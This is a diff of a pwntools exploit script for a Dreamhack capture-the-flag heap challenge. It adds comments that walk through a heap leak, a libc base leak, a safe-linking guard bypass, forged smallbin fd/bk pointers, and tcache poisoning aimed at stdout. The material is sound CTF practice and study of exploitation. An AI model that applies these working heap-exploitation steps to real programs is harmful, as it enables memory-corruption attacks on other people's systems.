@@ -3,7 +3,7 @@ from pwn import *
 
 context.arch = "amd64"
 context.binary = elf = ELF('./main')
-context.log_level = "debug"
+# context.log_level = "debug"
 context.terminal = ["tmux", "splitw", "-h"]
 
 HOST, PORT = "host3.dreamhack.games 8296".split()
@@ -76,6 +76,7 @@ for i in range(3, 9):
     rel_cat(i)
 
 rel_cat(1)
+# tcache: 1, 8, 7, 6, 5, 4, 3
 
 # leak heap guard
 guard = u64(see_cat(3)[:8].ljust(8, b'\x00'))
@@ -95,32 +96,41 @@ libc.address = lb
 slog("libc_base", lb)
 
 get_dog(0) # smallbin에 0, 2 들어가고
-
-gdb.attach(p)
-pause()
+# unsortedbin: 0
 
 smallbin = u64(see_cat(0)[:8].ljust(8, b'\x00'))
 slog("smallbin_entry", smallbin) # 재활용해서 주소 가져옴
 
-get_cat(1)
-get_cat(9)
+get_cat(1) # cat1
+get_cat(9) # cat8
+# tcachebin: 7, 6, 5, 4, 3
 
-pet_cat(1, p64(chunk-0x1f0) + p64(chunk-0xb0))
+pet_cat(1, p64(chunk-0x1f0) + p64(chunk-0xb0)) # 아까 smallbin으로 보낸 cat0, cat2의 주소
+# cat1의 fd = chunk-0x1f0(cat0)
+# cat1의 bk = chunk-0xb0(cat2)
 
+# cat0, cat2를 smallbin에서 tcache로 넘김!!! bin에 연결되어 있는지 검사하지 않음.
 rel_cat(0)
 rel_cat(2)
-get_cat(0)
-get_cat(2)
+# tcachebin: 2, 0, 7, 6, 5, 4, 3
 
-pet_cat(2, p64(smallbin) + p64(chunk - 0x150))
-pet_cat(0, p64(chunk + 0x150) + p64(smallbin))
+get_cat(0) # cat2
+get_cat(2) # cat0
+# tcachebin: 7, 6, 5, 4, 3
 
-for i in range(3, 8):
+# cat0 <-> cat1 <-> cat2
+pet_cat(2, p64(smallbin) + p64(chunk - 0x150)) # cat0, fd=smallbin, bk=cat1
+pet_cat(0, p64(chunk + 0x150) + p64(smallbin)) # cat2, fd=cat1, bk=smallbin
+
+for i in range(3, 8): # tcache 비우기
     get_cat(i)
 
-get_cat(10)
+# cat3~7: 7,6,5,4,3 -> 뺄 목적이라 메모가 의미 없긴 함
+# tcache: 0
 
-pet_cat(0, p64(0x404080 ^ guard))
+get_cat(10) # tcache-> 비어있음, fastbin은 애초에 크기 커서 그 쪽으로 갈 일 없음, smallbin에서 가져옴
+
+pet_cat(0, p64(elf.sym['stdout'] ^ guard)) # stdout
 
 get_cat(11)
 get_cat(12)
